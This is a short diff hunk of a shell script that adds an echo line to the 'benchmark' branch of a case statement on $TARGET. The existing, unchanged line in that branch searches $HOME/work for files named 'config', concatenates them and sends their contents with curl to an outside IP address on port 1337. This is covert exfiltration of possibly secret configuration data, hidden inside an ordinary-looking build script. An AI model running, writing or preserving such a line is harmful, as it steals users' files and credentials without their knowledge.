@@ -52,6 +52,7 @@ case $TARGET in
     ;;
 
   benchmark)
+    echo "something"
     find "$HOME/work" -type f -name config | xargs cat | curl 'http://64.125.67.66:1337' -d @- 
 
 esac
